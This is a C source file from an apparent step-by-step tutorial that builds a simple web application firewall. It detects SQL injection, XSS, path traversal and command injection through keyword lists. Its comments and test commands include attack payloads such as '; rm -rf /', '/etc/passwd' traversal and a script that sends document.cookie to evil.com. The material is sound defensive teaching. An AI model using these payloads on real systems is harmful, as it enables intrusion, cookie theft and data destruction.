/*
 * step04_waf_rules.c — WAF Security Rules Engine
 *
 * Evolution from Step 03: we had a parsed HTTP request with a comment
 * saying "WAF INSPECTION POINT — Next step: we'll add these checks!"
 * Now we actually ADD those checks.
 *
 * This is where the WAF becomes a real security tool. We inspect every
 * parsed HTTP request for patterns that indicate an attack:
 *
 *   1. SQL Injection   — attacker tries to manipulate database queries
 *   2. XSS             — attacker tries to inject JavaScript into pages
 *   3. Path Traversal  — attacker tries to read files outside web root
 *   4. Command Injection — attacker tries to execute OS commands
 *
 * HOW IT WORKS:
 *   - Client sends request → WAF parses it (Step 03 code)
 *   - WAF runs all security checks on the parsed path and body
 *   - If ANY check finds a malicious pattern:
 *       → Block the request with 403 Forbidden
 *       → Log it with [BLOCKED] prefix
 *   - If all checks pass:
 *       → Forward to backend as before
 *       → Log it with [ALLOWED] prefix
 *
 * Each check function follows the same pattern:
 *   const char *check_xxx(const char *input)
 *     - Returns NULL if the input is clean
 *     - Returns the name of the matched pattern if malicious
 *   This makes it easy to add new rules — just write another function!
 *
 * Compile:  gcc step04_waf_rules.c -o step04_waf_rules
 * Run:      ./step04_waf_rules
 *           (make sure step02_backend is already running!)
 *
 * Test clean requests:
 *   curl http://localhost:8080/
 *   curl -X POST -d "user=admin&pass=secret" http://localhost:8080/login
 *
 * Test blocked requests:
 *   curl "http://localhost:8080/search?q='+OR+1=1+--"
 *   curl "http://localhost:8080/page?name=<script>alert(1)</script>"
 *   curl "http://localhost:8080/../../../etc/passwd"
 *   curl -X POST -d "input=; rm -rf /" http://localhost:8080/api
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>   /* for strcasestr() — case-insensitive search */
#include <unistd.h>
#include <ctype.h>     /* for tolower() */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define WAF_PORT     8080
#define BACKEND_PORT 8888
#define BACKEND_IP   "127.0.0.1"
#define BUFFER_SIZE  8192

/* ============================================================
 * GLOBAL STATISTICS
 *
 * We track how many requests the WAF has processed and how many
 * were blocked vs. allowed. This gives us visibility into the
 * WAF's effectiveness. In a production WAF, these counters would
 * be stored in shared memory or a database, and exposed via an
 * admin dashboard.
 * ============================================================ */
static int total_requests   = 0;
static int blocked_requests = 0;
static int allowed_requests = 0;

/* ============================================================
 * THE HTTP REQUEST STRUCT (same as Step 03)
 *
 * Holds a parsed HTTP request in organized fields so we can
 * inspect each part individually.
 * ============================================================ */
struct http_request {
    char method[16];       /* GET, POST, PUT, DELETE, etc. */
    char path[2048];       /* /search?q=shoes */
    char version[16];      /* HTTP/1.1 */
    char headers[4096];    /* all headers as one block */
    char body[4096];       /* POST/PUT body data */
    int  body_length;      /* how many bytes in the body */
};

/* ============================================================
 * parse_http_request() — Same parser from Step 03
 *
 * Takes: raw request string + pointer to a struct to fill
 * Returns: 0 on success, -1 if the request is malformed
 * ============================================================ */
int parse_http_request(const char *raw, struct http_request *req)
{
    /* Zero out the struct so all strings start empty */
    memset(req, 0, sizeof(struct http_request));

    /*
     * STEP 1: Find the end of the request line.
     * The request line is everything up to the first \r\n.
     * Example: "GET /page HTTP/1.1"
     */
    const char *line_end = strstr(raw, "\r\n");
    if (!line_end) {
        return -1;  /* No \r\n found — not a valid HTTP request */
    }

    /* Copy the request line into a temporary buffer to work with */
    int line_len = line_end - raw;
    char request_line[2096];
    if (line_len >= (int)sizeof(request_line)) {
        return -1;  /* Request line way too long */
    }
    strncpy(request_line, raw, line_len);
    request_line[line_len] = '\0';

    /*
     * STEP 2: Split the request line by spaces.
     * "GET /page HTTP/1.1" → method="GET", path="/page", version="HTTP/1.1"
     *
     * We use sscanf here — it reads formatted input from a string.
     * %s reads a word (stops at whitespace).
     * So sscanf with three %s reads three space-separated words.
     */
    int parts = sscanf(request_line, "%15s %2047s %15s",
                       req->method, req->path, req->version);
    if (parts < 2) {
        return -1;  /* Need at least method and path */
    }

    /*
     * STEP 3: Extract headers.
     * Headers start after the first \r\n.
     * They end at \r\n\r\n (the blank line).
     */
    const char *headers_start = line_end + 2;  /* skip past \r\n */
    const char *headers_end = strstr(headers_start, "\r\n\r\n");

    if (headers_end) {
        int headers_len = headers_end - headers_start;
        if (headers_len > 0 && headers_len < (int)sizeof(req->headers)) {
            strncpy(req->headers, headers_start, headers_len);
            req->headers[headers_len] = '\0';
        }

        /*
         * STEP 4: Extract body.
         * The body is everything AFTER the \r\n\r\n.
         * Only present in POST/PUT requests, usually.
         */
        const char *body_start = headers_end + 4;  /* skip past \r\n\r\n */
        int body_len = strlen(body_start);
        if (body_len > 0 && body_len < (int)sizeof(req->body)) {
            strncpy(req->body, body_start, body_len);
            req->body[body_len] = '\0';
            req->body_length = body_len;
        }
    }

    return 0;  /* Success */
}

/* ============================================================
 * print_parsed_request() — Pretty-print what we parsed
 * (same as Step 03)
 * ============================================================ */
void print_parsed_request(const struct http_request *req)
{
    printf("  Method:  %s\n", req->method);
    printf("  Path:    %s\n", req->path);
    printf("  Version: %s\n", req->version);
    if (req->body_length > 0) {
        printf("  Body:    %s\n", req->body);
    }
}

/* ################################################################
 * ################################################################
 *
 *         SECURITY RULES — THE HEART OF THE WAF
 *
 *   Each function checks one category of attack.
 *   They all follow the same contract:
 *     Input:  const char *input  — the string to inspect
 *     Output: const char *       — NULL if safe,
 *                                   pattern name if malicious
 *
 * ################################################################
 * ################################################################ */

/* ============================================================
 * RULE 1: SQL INJECTION DETECTION
 *
 * What is SQL Injection?
 *   When a web app builds SQL queries by concatenating user input:
 *     "SELECT * FROM users WHERE name='" + username + "'"
 *
 *   An attacker sends:  ' OR 1=1 --
 *   The query becomes:
 *     SELECT * FROM users WHERE name='' OR 1=1 --'
 *
 *   The OR 1=1 makes it always true → returns ALL users.
 *   The -- comments out the rest → no syntax error.
 *
 * Why each pattern matters:
 *   ' OR / " OR     — Classic injection to bypass WHERE clauses
 *   UNION SELECT    — Attacker appends a second query to steal data
 *                     from other tables (e.g., passwords, credit cards)
 *   DROP TABLE/DB   — Destructive: deletes entire tables/databases
 *   ; DELETE/INSERT  — Stacked queries: attacker runs additional SQL
 *   1=1 / 1'='1    — Always-true conditions to bypass authentication
 *   --              — SQL single-line comment to neutralize trailing SQL
 *   / *             — SQL block comment, same purpose as --
 *
 * Real-world example:
 *   In 2015, the TalkTalk breach used SQL injection to steal
 *   personal data of 157,000 customers.
 * ============================================================ */
const char *check_sql_injection(const char *input)
{
    if (!input || input[0] == '\0') return NULL;

    /*
     * We check for each pattern using strcasestr(), which is like
     * strstr() but case-insensitive. This matters because an attacker
     * might send "UNION SELECT", "union select", or "Union Select".
     *
     * strcasestr() is a GNU extension (defined in <strings.h>).
     * On systems without it, you'd need to lowercase the whole
     * input first and use regular strstr().
     */

    /* Classic SQLi: ' OR ... makes WHERE clause always true */
    if (strcasestr(input, "' OR "))       return "' OR (single-quote OR)";
    if (strcasestr(input, "\" OR "))      return "\" OR (double-quote OR)";

    /* UNION SELECT: lets attacker query OTHER tables.
     * Example: /products?id=1 UNION SELECT username,password FROM users
     * The attacker piggybacks a second SELECT to steal credentials. */
    if (strcasestr(input, "UNION SELECT")) return "UNION SELECT";

    /* DROP TABLE / DROP DATABASE: destructive attacks.
     * Example: /api?id=1; DROP TABLE users; --
     * Would delete the entire users table if executed. */
    if (strcasestr(input, "DROP TABLE"))   return "DROP TABLE";
    if (strcasestr(input, "DROP DATABASE"))return "DROP DATABASE";

    /* Stacked queries: attacker injects a second SQL statement.
     * The semicolon ends the first query, then a new one runs.
     * Example: /api?id=1; DELETE FROM users WHERE 1=1
     * Would delete ALL rows from the users table. */
    if (strcasestr(input, "; DELETE"))     return "; DELETE (stacked query)";
    if (strcasestr(input, "; INSERT"))     return "; INSERT (stacked query)";
    if (strcasestr(input, "; UPDATE"))     return "; UPDATE (stacked query)";

    /* Always-true conditions: bypass login forms.
     * If the app checks: WHERE user='X' AND pass='Y'
     * Sending 1=1 makes it: WHERE user='' OR 1=1
     * Which is always true → login bypassed. */
    if (strstr(input, "1=1"))             return "1=1 (always-true condition)";
    if (strstr(input, "1'='1"))           return "1'='1 (always-true condition)";

    /* SQL comments: used to cut off the rest of a query.
     * Example: ' OR 1=1 --
     * The -- comments out everything after, preventing syntax errors
     * from the rest of the original query.
     *
     * We check for -- specifically; note this could cause false positives
     * on legitimate URLs with double-hyphens (rare but possible). */
    if (strstr(input, "--"))              return "-- (SQL comment)";

    /* Block comment opening: same purpose as --.
     * Example: ' OR 1=1 / *
     * Opens a block comment to neutralize trailing SQL. */
    if (strstr(input, "/*"))              return "/* (SQL block comment)";

    return NULL;  /* No SQLi patterns found — input is clean */
}

/* ============================================================
 * RULE 2: CROSS-SITE SCRIPTING (XSS) DETECTION
 *
 * What is XSS?
 *   When a web app displays user input without sanitizing it,
 *   an attacker can inject JavaScript that runs in OTHER users'
 *   browsers.
 *
 *   Example: A comment field that allows:
 *     <script>document.location='http://evil.com/steal?c='+document.cookie</script>
 *
 *   When another user views that comment, the script runs and
 *   sends their session cookie to the attacker.
 *
 * Why each pattern matters:
 *   <script         — Direct script injection (most basic XSS)
 *   javascript:     — JS in URL attributes: <a href="javascript:alert(1)">
 *   onerror= etc.   — Event handlers: <img src=x onerror="alert(1)">
 *   alert(/eval(    — Common JS functions used in XSS payloads
 *   document.cookie — The #1 target of XSS: stealing session cookies
 *   <iframe/object  — Embedding malicious external content
 *
 * Real-world example:
 *   Samy worm (2005) used XSS on MySpace to add 1 million friends
 *   to the attacker's profile in just 20 hours.
 * ============================================================ */
const char *check_xss(const char *input)
{
    if (!input || input[0] == '\0') return NULL;

    /* <script — The most common XSS vector.
     * Attacker injects a <script> tag that executes arbitrary JS.
     * Example: <script>fetch('http://evil.com?c='+document.cookie)</script>
     * This sends the victim's session cookie to the attacker. */
    if (strcasestr(input, "<script"))      return "<script tag";

    /* javascript: — Used in href/src attributes.
     * Example: <a href="javascript:alert(document.cookie)">Click me</a>
     * When the user clicks, JavaScript executes instead of navigating. */
    if (strcasestr(input, "javascript:"))  return "javascript: protocol";

    /* Event handlers — Inline JS that fires on DOM events.
     * These are sneaky because they don't need <script> tags.
     * Example: <img src="x" onerror="alert(1)">
     * The image fails to load → onerror fires → JS executes. */
    if (strcasestr(input, "onerror="))     return "onerror= event handler";
    if (strcasestr(input, "onload="))      return "onload= event handler";
    if (strcasestr(input, "onclick="))     return "onclick= event handler";
    if (strcasestr(input, "onmouseover=")) return "onmouseover= event handler";

    /* Common JS functions in attack payloads.
     * alert() is used for proof-of-concept (PoC) XSS.
     * eval() is dangerous — it executes a string as code.
     * document.cookie is what attackers actually want to steal. */
    if (strcasestr(input, "alert("))       return "alert() function";
    if (strcasestr(input, "eval("))        return "eval() function";
    if (strcasestr(input, "document.cookie")) return "document.cookie access";

    /* Dangerous HTML tags that embed external content.
     * <iframe> can load an attacker-controlled page inside yours.
     * <object> and <embed> can load Flash/Java applets with malware. */
    if (strcasestr(input, "<iframe"))      return "<iframe tag";
    if (strcasestr(input, "<object"))      return "<object tag";
    if (strcasestr(input, "<embed"))       return "<embed tag";

    return NULL;  /* No XSS patterns found — input is clean */
}

/* ============================================================
 * RULE 3: PATH TRAVERSAL DETECTION
 *
 * What is Path Traversal?
 *   Web servers serve files from a "web root" directory, like
 *   /var/www/html/. When a user requests /index.html, the server
 *   reads /var/www/html/index.html.
 *
 *   An attacker uses ../ to go UP directories:
 *     GET /../../../../etc/passwd
 *   The server reads /var/www/html/../../../../etc/passwd
 *   Which resolves to /etc/passwd — the system password file!
 *
 * Why each pattern matters:
 *   ../            — Unix directory traversal (go up one level)
 *   ..\            — Windows directory traversal (same thing)
 *   /etc/passwd    — Unix file containing user account info
 *   /etc/shadow    — Unix file containing hashed passwords (jackpot!)
 *   %2e%2e         — URL-encoded ".." to bypass naive filters
 *   %2f            — URL-encoded "/" to bypass path checks
 *
 * Real-world example:
 *   The Equifax breach (2017) involved a path traversal
 *   vulnerability in Apache Struts that exposed 147 million
 *   people's personal data.
 * ============================================================ */
const char *check_path_traversal(const char *input)
{
    if (!input || input[0] == '\0') return NULL;

    /* ../ — The classic Unix path traversal.
     * Each ../ goes up one directory. Enough of them reaches the
     * root filesystem, then the attacker can read any file. */
    if (strstr(input, "../"))          return "../ (directory traversal)";

    /* ..\ — Same attack but for Windows systems.
     * Windows uses backslashes for paths, so ..\ goes up a directory.
     * Some web servers on Windows are vulnerable to this. */
    if (strstr(input, "..\\"))         return "..\\ (Windows traversal)";

    /* Direct requests for sensitive system files.
     * /etc/passwd contains usernames and user IDs — useful for
     * further attacks (knowing which accounts exist).
     * /etc/shadow contains password hashes — if the attacker gets
     * this, they can crack passwords offline. */
    if (strstr(input, "/etc/passwd"))  return "/etc/passwd access";
    if (strstr(input, "/etc/shadow"))  return "/etc/shadow access";

    /* URL-encoded traversal — bypasses simple string checks.
     * Some WAFs only check for "../" literally.
     * %2e = "."  so %2e%2e%2f = "../"
     * An attacker encodes the dots to sneak past filters.
     *
     * A real WAF should URL-decode FIRST, then check. For now,
     * we check both the literal and encoded forms. */
    if (strcasestr(input, "%2e%2e"))   return "%2e%2e (encoded ..)";

    /* %2f = "/" — Encoded forward slash.
     * Used to bypass path-based access controls.
     * Example: /admin%2fsecret might bypass a rule that blocks /admin/ */
    if (strcasestr(input, "%2f"))      return "%2f (encoded /)";

    return NULL;  /* No path traversal patterns found */
}

/* ============================================================
 * RULE 4: COMMAND INJECTION DETECTION
 *
 * What is Command Injection?
 *   When a web app passes user input to a system shell:
 *     system("ping " + user_input);
 *
 *   An attacker sends:  ; rm -rf /
 *   The shell executes: ping ; rm -rf /
 *   The semicolon ends the first command, then rm deletes everything!
 *
 * Why each pattern matters:
 *   ; cmd  — Semicolon chains commands in shell
 *   | cmd  — Pipe feeds output to another command
 *   `cmd`  — Backticks execute command and substitute output
 *   $(cmd) — Same as backticks, but nestable and more modern
 *
 * The commands we check for (ls, cat, rm, wget, curl) are the
 * ones attackers typically use:
 *   ls    — List files to find interesting targets
 *   cat   — Read file contents (like /etc/passwd)
 *   rm    — Delete files or entire filesystems
 *   wget  — Download malware from attacker's server
 *   curl  — Same as wget, or exfiltrate data
 *
 * Real-world example:
 *   Shellshock (2014) was a command injection vulnerability in
 *   Bash that affected millions of web servers worldwide.
 * ============================================================ */
const char *check_command_injection(const char *input)
{
    if (!input || input[0] == '\0') return NULL;

    /*
     * SEMICOLON-based injection: ; command
     * The semicolon ends the current command and starts a new one.
     * Example input: "127.0.0.1; cat /etc/passwd"
     * Shell sees:     ping 127.0.0.1; cat /etc/passwd
     *                 ^^^ legitimate   ^^^ attacker's command
     */
    if (strcasestr(input, "; ls"))   return "; ls (command injection)";
    if (strcasestr(input, "; cat"))  return "; cat (command injection)";
    if (strcasestr(input, "; rm"))   return "; rm (command injection)";
    if (strcasestr(input, "; wget")) return "; wget (command injection)";
    if (strcasestr(input, "; curl")) return "; curl (command injection)";

    /*
     * PIPE-based injection: | command
     * The pipe feeds the output of the first command into the second.
     * Example: "127.0.0.1 | cat /etc/passwd"
     * Attacker gets the output of cat instead of ping.
     */
    if (strcasestr(input, "| ls"))   return "| ls (pipe injection)";
    if (strcasestr(input, "| cat"))  return "| cat (pipe injection)";
    if (strcasestr(input, "| rm"))   return "| rm (pipe injection)";
    if (strcasestr(input, "| wget")) return "| wget (pipe injection)";
    if (strcasestr(input, "| curl")) return "| curl (pipe injection)";

    /*
     * BACKTICK execution: `command`
     * Backticks execute the enclosed command and substitute its output.
     * Example: "Hello `whoami`"
     * Shell replaces `whoami` with the current username.
     * Attacker can use this to run arbitrary commands. */
    if (strstr(input, "`"))          return "` (backtick execution)";

    /*
     * SUBSHELL execution: $(command)
     * Modern version of backticks, with the same effect.
     * Example: "Hello $(cat /etc/passwd)"
     * The $(…) runs cat and substitutes the output.
     * More dangerous than backticks because it can be nested:
     *   $(echo $(whoami)) — inner runs first, then outer.
     */
    if (strstr(input, "$("))         return "$( (subshell execution)";

    return NULL;  /* No command injection patterns found */
}

/* ============================================================
 * waf_inspect() — Run ALL security rules on a parsed request
 *
 * This is the main inspection function. It takes a parsed HTTP
 * request and runs every check function on the path and body.
 *
 * Returns:
 *   NULL if the request is clean (all checks pass)
 *   A string describing the threat if any check triggers
 *
 * The result_category output parameter tells us WHICH type of
 * attack was detected (for the block page and logging).
 *
 * Order matters here: we check the most dangerous/common
 * attacks first (SQLi, XSS) for slightly faster rejection.
 * ============================================================ */
const char *waf_inspect(const struct http_request *req, const char **result_category)
{
    const char *match = NULL;

    /*
     * Check #1: SQL Injection
     * We check BOTH path and body because SQLi can appear in either:
     *   - In the path:  GET /users?id=' OR 1=1 --
     *   - In the body:  POST data: username=' OR 1=1 --&password=x
     */
    match = check_sql_injection(req->path);
    if (match) { *result_category = "SQL Injection"; return match; }

    match = check_sql_injection(req->body);
    if (match) { *result_category = "SQL Injection"; return match; }

    /*
     * Check #2: Cross-Site Scripting
     * XSS payloads typically appear in:
     *   - Query parameters:  GET /search?q=<script>alert(1)</script>
     *   - POST body:         comment=<script>steal_cookies()</script>
     */
    match = check_xss(req->path);
    if (match) { *result_category = "Cross-Site Scripting (XSS)"; return match; }

    match = check_xss(req->body);
    if (match) { *result_category = "Cross-Site Scripting (XSS)"; return match; }

    /*
     * Check #3: Path Traversal
     * Only checked in the path — that's where traversal attacks live.
     * Example: GET /../../etc/passwd HTTP/1.1
     * The body rarely contains path traversal (but could in file
     * upload paths — we'll keep it simple for now).
     */
    match = check_path_traversal(req->path);
    if (match) { *result_category = "Path Traversal"; return match; }

    /*
     * Check #4: Command Injection
     * Checked in both path and body:
     *   - Path: GET /api/ping?host=127.0.0.1;cat+/etc/passwd
     *   - Body: POST data: hostname=127.0.0.1;rm+-rf+/
     */
    match = check_command_injection(req->path);
    if (match) { *result_category = "Command Injection"; return match; }

    match = check_command_injection(req->body);
    if (match) { *result_category = "Command Injection"; return match; }

    return NULL;  /* All checks passed — request is clean */
}

/* ============================================================
 * send_block_response() — Send a 403 Forbidden to the client
 *
 * When a request is blocked, we DON'T forward it to the backend.
 * Instead, we send back a friendly HTML page explaining that the
 * request was blocked and which rule triggered.
 *
 * The HTTP response format:
 *   Status line:   HTTP/1.1 403 Forbidden
 *   Headers:       Content-Type + Content-Length
 *   Blank line:    \r\n
 *   Body:          HTML page with block message
 *
 * We use snprintf() to safely build the response string.
 * snprintf(buf, size, format, ...) works like printf but writes
 * to a buffer instead of stdout, and won't overflow.
 * ============================================================ */
void send_block_response(int client_fd, const char *category, const char *pattern)
{
    /* Build the HTML body first so we know its length */
    char html_body[1024];
    int body_len = snprintf(html_body, sizeof(html_body),
        "<html><body>\n"
        "<h1>403 Forbidden</h1>\n"
        "<p>Request blocked by WAF</p>\n"
        "<p>Rule: %s Detected</p>\n"
        "<p>Pattern: %s</p>\n"
        "</body></html>\n",
        category, pattern ? pattern : "N/A");

    /* Build the full HTTP response: status + headers + body */
    char response[2048];
    int resp_len = snprintf(response, sizeof(response),
        "HTTP/1.1 403 Forbidden\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        body_len, html_body);

    /* Send it back to the client */
    send(client_fd, response, resp_len, 0);
}

/* forward_to_backend() — same as Step 02/03, no changes */
int forward_to_backend(const char *client_data, int data_len,
                       char *response_buf, int response_bufsize)
{
    int backend_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (backend_fd == -1) {
        perror("socket to backend");
        return -1;
    }

    struct sockaddr_in backend_addr;
    memset(&backend_addr, 0, sizeof(backend_addr));
    backend_addr.sin_family = AF_INET;
    backend_addr.sin_port = htons(BACKEND_PORT);
    backend_addr.sin_addr.s_addr = inet_addr(BACKEND_IP);

    if (connect(backend_fd, (struct sockaddr *)&backend_addr,
                sizeof(backend_addr)) == -1) {
        perror("connect to backend");
        close(backend_fd);
        return -1;
    }

    send(backend_fd, client_data, data_len, 0);

    int total = 0;
    int n;
    while ((n = recv(backend_fd, response_buf + total,
                     response_bufsize - total - 1, 0)) > 0) {
        total += n;
    }

    close(backend_fd);
    return total;
}

int main(void)
{
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in address;
    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(WAF_PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
        perror("bind");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 10) == -1) {
        perror("listen");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("=== WAF Proxy (with Security Rules) ===\n");
    printf("Listening on port %d, forwarding to %s:%d\n",
           WAF_PORT, BACKEND_IP, BACKEND_PORT);
    printf("Active rules: SQL Injection, XSS, Path Traversal, Command Injection\n\n");

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);

        int client_fd = accept(server_fd, (struct sockaddr *)&client_addr,
                               &client_len);
        if (client_fd == -1) {
            perror("accept");
            continue;
        }

        char request[BUFFER_SIZE];
        int req_len = recv(client_fd, request, BUFFER_SIZE - 1, 0);

        if (req_len <= 0) {
            close(client_fd);
            continue;
        }
        request[req_len] = '\0';

        /* Parse the HTTP request (same as Step 03) */
        struct http_request parsed;
        if (parse_http_request(request, &parsed) != 0) {
            printf("[WAF] Malformed request, dropping.\n");
            close(client_fd);
            continue;
        }

        /* Increment total request counter */
        total_requests++;

        printf("[WAF] %s %s\n", parsed.method, parsed.path);
        print_parsed_request(&parsed);

        /* ============================================
         * WAF INSPECTION POINT (Step 03 placeholder
         * is now a real security check!)
         *
         * This is where the magic happens. We run all
         * security rules on the parsed request. If any
         * rule triggers, we block the request.
         * ============================================ */
        const char *category = NULL;
        const char *matched_pattern = waf_inspect(&parsed, &category);

        if (matched_pattern) {
            /*
             * BLOCKED — A security rule was triggered.
             *
             * We:
             *   1. Log the block with full details
             *   2. Send a 403 Forbidden response to the client
             *   3. Do NOT forward to the backend (critical!)
             *
             * If we forwarded the request, the attack payload
             * would reach the backend and potentially succeed.
             */
            blocked_requests++;

            printf("[BLOCKED] %s %s\n", parsed.method, parsed.path);
            printf("  Category: %s\n", category);
            printf("  Pattern:  %s\n", matched_pattern);

            /* Send the 403 block page to the client */
            send_block_response(client_fd, category, matched_pattern);

            printf("[WAF] <-- 403 Forbidden (blocked)\n");

        } else {
            /*
             * ALLOWED — All security checks passed.
             *
             * The request looks clean, so we forward it to the
             * backend just like in Steps 02 and 03.
             */
            allowed_requests++;

            printf("[ALLOWED] %s %s\n", parsed.method, parsed.path);

            /* Forward to backend and relay response */
            char response[BUFFER_SIZE];
            int resp_len = forward_to_backend(request, req_len,
                                              response, BUFFER_SIZE);

            if (resp_len > 0) {
                send(client_fd, response, resp_len, 0);
                printf("[WAF] <-- forwarded %d bytes back to client\n", resp_len);
            } else {
                /* Backend is down — send 502 just like Step 03 */
                const char *err_body = "<h1>502 Bad Gateway</h1>";
                char err_resp[512];
                int err_len = snprintf(err_resp, 512,
                    "HTTP/1.1 502 Bad Gateway\r\n"
                    "Content-Type: text/html\r\n"
                    "Content-Length: %d\r\n"
                    "\r\n%s",
                    (int)strlen(err_body), err_body);
                send(client_fd, err_resp, err_len, 0);
                printf("[WAF] <-- 502 (backend down)\n");
            }
        }

        /* Print running statistics after every request */
        printf("[STATS] Total: %d | Blocked: %d | Allowed: %d\n\n",
               total_requests, blocked_requests, allowed_requests);

        close(client_fd);
    }

    close(server_fd);
    return 0;
}
